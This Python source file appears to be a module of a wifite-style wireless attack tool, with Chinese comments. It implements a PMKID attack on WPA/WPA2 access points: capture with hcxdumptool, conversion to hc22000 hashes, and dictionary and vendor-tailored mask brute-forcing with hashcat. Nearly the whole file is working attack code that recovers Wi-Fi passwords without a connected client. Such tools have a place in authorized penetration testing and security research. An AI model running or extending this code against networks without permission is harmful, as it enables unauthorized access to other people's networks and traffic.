#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PMKID 攻击 (clientless / RSN IE)

现代流程 (2024–2026 Kali):
  hcxdumptool → pcapng → hcxpcapngtool → WPA*01*... (hc22000)
  hashcat -m 22000

参考:
  - https://hashcat.net/forum/thread-7717.html (PMKID 披露)
  - https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2
  - NCC Group: PMKID 并非仅限 802.11r
"""

from ..model.attack import Attack
from ..config import Configuration
from ..tools.hashcat import HcxDumpTool, HcxPcapTool, Hashcat
from ..util.color import Color
from ..util.i18n import t
from ..util.timer import Timer
from ..model.pmkid_result import CrackResultPMKID

from threading import Thread
import os
import time
import re


class AttackPMKID(Attack):

    def __init__(self, target):
        super(AttackPMKID, self).__init__(target)
        self.crack_result = None
        self.success = False
        self.pcapng_file = Configuration.temp('pmkid.pcapng')

    def get_existing_pmkid_file(self, bssid):
        """加载 hs/ 下已有 PMKID/22000 哈希。"""
        if not os.path.exists(Configuration.wpa_handshake_dir):
            return None

        bssid = bssid.lower().replace(':', '')
        # 现代 .hc22000/.22000 + 旧 .16800
        file_re = re.compile(r'.*pmkid_.*\.(16800|22000|hc22000)$', re.I)

        for filename in os.listdir(Configuration.wpa_handshake_dir):
            pmkid_filename = os.path.join(Configuration.wpa_handshake_dir, filename)
            if not os.path.isfile(pmkid_filename):
                continue
            if not file_re.match(filename) and not file_re.match(pmkid_filename):
                continue

            try:
                with open(pmkid_filename, 'r', encoding='utf-8', errors='replace') as fh:
                    for pmkid_hash in fh:
                        pmkid_hash = pmkid_hash.strip()
                        if not pmkid_hash or pmkid_hash.count('*') < 3:
                            continue
                        parts = pmkid_hash.split('*')
                        # WPA*01*pmkid*macap*...
                        if parts[0] == 'WPA' and len(parts) >= 4:
                            existing = parts[3].lower().replace(':', '')
                        else:
                            existing = parts[1].lower().replace(':', '')
                        if existing == bssid:
                            return pmkid_filename
            except OSError:
                continue
        return None

    def run(self):
        from ..util.process import Process
        missing = []
        if not Process.exists('hashcat'):
            missing.append('hashcat')
        if not Process.exists('hcxdumptool'):
            missing.append('hcxdumptool')
        if not HcxPcapTool.exists():
            missing.append('hcxpcapngtool')
        if missing:
            Color.pl('{!} {O}%s{W}' % t('pmkid.skip', ', '.join(missing)))
            Color.pl('{!} {O}%s{W}' % t('pmkid.install'))
            return False

        pmkid_file = None
        if Configuration.ignore_old_handshakes is False:
            pmkid_file = self.get_existing_pmkid_file(self.target.bssid)
            if pmkid_file is not None:
                Color.pattack('PMKID', self.target, 'CAPTURE',
                              t('pmkid.exist', pmkid_file) + '\n')

        if pmkid_file is None:
            pmkid_file = self.capture_pmkid()

        if pmkid_file is None:
            return False

        try:
            self.success = self.crack_pmkid_file(pmkid_file)
        except KeyboardInterrupt:
            Color.pl('\n{!} {R}%s{W}' % t('pmkid.interrupted'))
            self.success = False
            return False

        # 只有破解成功才停止后续攻击；仅抓到哈希时继续尝试 WPA 握手路径。
        return self.success

    def capture_pmkid(self):
        self.keep_capturing = True
        self.timer = Timer(Configuration.pmkid_timeout)

        t = Thread(target=self.dumptool_thread)
        t.daemon = True
        t.start()

        pmkid_hash = None
        pcaptool = HcxPcapTool(self.target)
        while self.timer.remaining() > 0:
            pmkid_hash = pcaptool.get_pmkid_hash(self.pcapng_file)
            if pmkid_hash is not None:
                break
            Color.pattack('PMKID', self.target, 'CAPTURE',
                          t('pmkid.wait', str(self.timer)))
            time.sleep(1)

        self.keep_capturing = False
        t.join(timeout=3)

        if pmkid_hash is None:
            Color.pattack('PMKID', self.target, 'CAPTURE',
                          '{R}%s{W}\n' % t('pmkid.fail'))
            Color.pl('{!} {O}%s{W}' % t('pmkid.hint'))
            Color.pl('')
            return None

        Color.clear_entire_line()
        Color.pattack('PMKID', self.target, 'CAPTURE', '{G}%s{W}' % t('pmkid.ok'))
        return self.save_pmkid(pmkid_hash)

    def crack_pmkid_file(self, pmkid_file):
        if Configuration.wordlist is None:
            Color.pl('\n{!} {O}%s{W}' % t('pmkid.no_wordlist'))
            key = None
        else:
            Color.clear_entire_line()
            Color.pattack('PMKID', self.target, 'CRACK',
                          t('wpa.crack', 'hashcat -m 22000') + '\n')
            key = Hashcat.crack_pmkid(pmkid_file)

        # 国内 WiFi 智能优化：字典失败后自动追加国内常用掩码管线（闭环）
        if key is None and getattr(Configuration, 'cn_optimize', False):
            key = self._cn_mask_pipeline(pmkid_file)

        if key is None:
            if Configuration.wordlist is not None or getattr(Configuration, 'cn_optimize', False):
                Color.clear_entire_line()
                Color.pattack('PMKID', self.target, '{R}CRACK',
                              '{R}%s{W}\n' % t('pmkid.crack_fail'))
            return False

        Color.clear_entire_line()
        Color.pattack('PMKID', self.target, 'CRACKED', '{C}%s{W}' % t('wpa.ok', key))
        self.crack_result = CrackResultPMKID(
            self.target.bssid, self.target.essid, pmkid_file, key)
        Color.pl('\n')
        self.crack_result.dump()
        return True

    def _cn_mask_pipeline(self, pmkid_file):
        '''国内 WiFi 掩码自动管线：按优先级跑掩码爆破，命中即返回。'''
        from ..util.cn_strategy import recommend_masks
        from ..util.router_advisory import identify_vendor
        vendor = identify_vendor(self.target.bssid) or ''
        masks = recommend_masks(self.target.essid, vendor,
                                limit=getattr(Configuration, 'cn_mask_limit', 4))
        Color.clear_entire_line()
        Color.pattack('PMKID', self.target, 'CN-OPT',
                      t('wpa.cn_run', len(masks)) + '\n')
        for idx, mask in enumerate(masks, 1):
            if Hashcat._runtime_seconds() < 1 and getattr(Configuration, 'path_deadline', None):
                break
            Color.clear_entire_line()
            Color.pattack('PMKID', self.target, 'CN-OPT',
                          'mask {C}%d/%d{W} {D}%s{W} ...\n' % (idx, len(masks), mask))
            key = Hashcat.crack_hc22000_mask(pmkid_file, mask, verbose=False)
            if key:
                return key
        return None

    def dumptool_thread(self):
        dumptool = HcxDumpTool(self.target, self.pcapng_file)
        while self.keep_capturing and dumptool.poll() is None:
            time.sleep(0.5)
        dumptool.interrupt()

    def save_pmkid(self, pmkid_hash):
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)

        essid_safe = re.sub(r'[^a-zA-Z0-9]', '', self.target.essid or 'hidden')
        bssid_safe = self.target.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        # 现代扩展名
        pmkid_file = 'pmkid_%s_%s_%s.hc22000' % (essid_safe, bssid_safe, date)
        pmkid_file = os.path.join(Configuration.wpa_handshake_dir, pmkid_file)

        Color.p('\n{+} Saving {C}hc22000{W} hash to {C}%s{W} ' % pmkid_file)
        with open(pmkid_file, 'w', encoding='utf-8') as fh:
            fh.write(pmkid_hash.strip() + '\n')
        return pmkid_file
